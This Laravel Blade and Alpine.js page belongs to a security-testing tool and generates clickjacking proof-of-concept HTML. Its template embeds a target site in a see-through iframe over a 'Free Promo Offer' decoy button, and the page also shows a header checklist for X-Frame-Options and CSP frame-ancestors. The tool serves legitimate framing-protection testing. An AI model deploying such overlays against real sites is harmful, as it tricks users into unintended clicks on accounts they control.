<x-app-layout>
    <div class="w-full px-4 sm:px-6 md:px-8 py-8">
        <!-- Header -->
        <div class="mb-10 flex flex-col md:flex-row md:items-center md:justify-between gap-4">
            <div>
                <h1 class="text-3xl font-extrabold tracking-tight text-foreground" style="font-family: var(--font-brand);">Clickjacking PoC Generator</h1>
                <p class="text-sm text-muted-foreground mt-1.5 max-w-2xl">Validate frame inclusion protection headers (X-Frame-Options / CSP frame-ancestors) and generate visual proof-of-concepts.</p>
            </div>
            
            <div class="flex items-center gap-2">
                <span class="text-xs text-muted-foreground/60 select-none">Utility Module</span>
                <span class="h-1.5 w-1.5 rounded-full bg-primary animate-pulse"></span>
            </div>
        </div>

        <!-- Main Interface -->
        <div class="grid gap-6 lg:grid-cols-3" x-data="{
            targetUrl: 'https://example.com/login',
            opacity: 30,
            pocTitle: 'Free Promo Offer',
            generateHtml() {
                return `&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n  &lt;title&gt;Clickjacking POC&lt;/title&gt;\n  &lt;style&gt;\n    .wrapper { position: relative; width: 100%; height: 600px; }\n    .decoy-btn { position: absolute; top: 150px; left: 100px; z-index: 1; padding: 10px 20px; bg: red; }\n    iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: ${this.opacity / 100}; z-index: 2; border: none; }\n  &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;div class=&quot;wrapper&quot;&gt;\n    &lt;button class=&quot;decoy-btn&quot;&gt;${this.pocTitle}&lt;/button&gt;\n    &lt;iframe src=&quot;${this.targetUrl}&quot;&gt;&lt;/iframe&gt;\n  &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;`;
            }
        }">
            <!-- Config Column -->
            <div class="space-y-6">
                <!-- Sandbox Config Card -->
                <div class="app-chrome-surface p-6 rounded-2xl border border-border/40 shadow-sm">
                    <h3 class="text-sm font-bold uppercase tracking-wider text-muted-foreground/80 mb-4">Configuration</h3>
                    
                    <div class="space-y-4">
                        <div>
                            <label class="block text-[11px] font-semibold text-muted-foreground mb-1.5 uppercase tracking-wider">Target URL to Frame</label>
                            <input type="text" x-model="targetUrl" class="w-full bg-muted/30 border border-border/40 rounded-lg px-3 py-2 text-xs text-foreground focus:outline-none focus:ring-1 focus:ring-primary/20">
                        </div>

                        <div>
                            <label class="block text-[11px] font-semibold text-muted-foreground mb-1.5 uppercase tracking-wider">Decoy Button Label</label>
                            <input type="text" x-model="pocTitle" class="w-full bg-muted/30 border border-border/40 rounded-lg px-3 py-2 text-xs text-foreground focus:outline-none focus:ring-1 focus:ring-primary/20">
                        </div>

                        <div>
                            <div class="flex items-center justify-between mb-1.5">
                                <label class="block text-[11px] font-semibold text-muted-foreground uppercase tracking-wider">Iframe Opacity (<span x-text="opacity + '%'"></span>)</label>
                            </div>
                            <input type="range" min="0" max="100" x-model="opacity" class="w-full h-1 bg-muted/50 rounded-lg appearance-none cursor-pointer accent-primary">
                            <div class="flex justify-between text-[10px] text-muted-foreground/75 mt-1 font-mono">
                                <span>0% (Invisible)</span>
                                <span>100% (Solid)</span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Header Checker Alert Card -->
                <div class="app-chrome-surface p-6 rounded-2xl border border-border/40 shadow-sm">
                    <h4 class="text-sm font-bold uppercase tracking-wider text-muted-foreground/80 mb-3">Defensive Header Checklist</h4>
                    <div class="space-y-3.5 text-xs">
                        <div class="flex items-center justify-between">
                            <span class="text-muted-foreground">X-Frame-Options</span>
                            <span class="px-2 py-0.5 rounded text-[10px] font-mono bg-rose-500/10 text-rose-400 border border-rose-500/15">MISSING</span>
                        </div>
                        <div class="flex items-center justify-between">
                            <span class="text-muted-foreground">CSP frame-ancestors</span>
                            <span class="px-2 py-0.5 rounded text-[10px] font-mono bg-rose-500/10 text-rose-400 border border-rose-500/15">MISSING</span>
                        </div>
                        <div class="h-px bg-border/40 my-1"></div>
                        <p class="text-[11px] leading-relaxed text-muted-foreground">If these headers are absent or misconfigured, browsers will allow this target site to load inside foreign nested iframe elements.</p>
                    </div>
                </div>
            </div>

            <!-- Preview and Code Output Columns -->
            <div class="lg:col-span-2 space-y-6">
                <!-- Sandbox Live Preview -->
                <div class="app-chrome-surface p-6 rounded-2xl border border-border/40 shadow-sm relative flex flex-col min-h-[300px]">
                    <h3 class="text-sm font-bold uppercase tracking-wider text-muted-foreground/80 mb-4">Clickjacking Overlay Sandbox</h3>
                    
                    <!-- Sandbox Frame Arena -->
                    <div class="flex-1 border border-border/30 rounded-xl relative overflow-hidden bg-muted/10 flex items-center justify-center p-8 select-none">
                        <!-- Decoy Layer (Behind) -->
                        <div class="absolute inset-0 flex items-center justify-center flex-col pointer-events-none z-10">
                            <div class="p-6 bg-gradient-to-br from-indigo-500 to-blue-500 rounded-xl text-center shadow-lg max-w-sm">
                                <h4 class="text-sm font-extrabold text-white mb-2">LIMITED TIME DEAL!</h4>
                                <p class="text-[10px] text-white/80 mb-4">Click button to claim your $100 reward package.</p>
                                <button class="px-4 py-2 bg-yellow-400 hover:bg-yellow-300 text-slate-900 font-bold rounded-lg text-xs tracking-wider cursor-pointer border-0 shadow-md">
                                    <span x-text="pocTitle"></span>
                                </button>
                            </div>
                        </div>

                        <!-- Target Frame Simulator Layer (In Front) -->
                        <div class="absolute inset-0 bg-[#0F172A] flex items-center justify-center border border-dashed border-red-500/30 z-20 pointer-events-none"
                             :style="'opacity: ' + (opacity / 100)">
                            <div class="text-center p-4">
                                <div class="text-[11px] font-mono text-cyan-400 mb-1">Target Application Frame Simulator</div>
                                <div class="text-xs font-semibold text-foreground" x-text="targetUrl"></div>
                                <div class="mt-4 text-[10px] text-muted-foreground">Clicking here aligns with the decoy button click zone</div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Code Template Output Card -->
                <div class="app-chrome-surface p-6 rounded-2xl border border-border/40 shadow-sm">
                    <h3 class="text-sm font-bold uppercase tracking-wider text-muted-foreground/80 mb-3">PoC Exploit HTML Code</h3>
                    <div class="relative bg-black/40 rounded-xl border border-border/30 p-4">
                        <pre class="text-[11px] font-mono text-cyan-400/90 overflow-x-auto whitespace-pre-wrap select-all leading-relaxed" x-text="generateHtml()"></pre>
                    </div>
                </div>
            </div>
        </div>
    </div>
</x-app-layout>
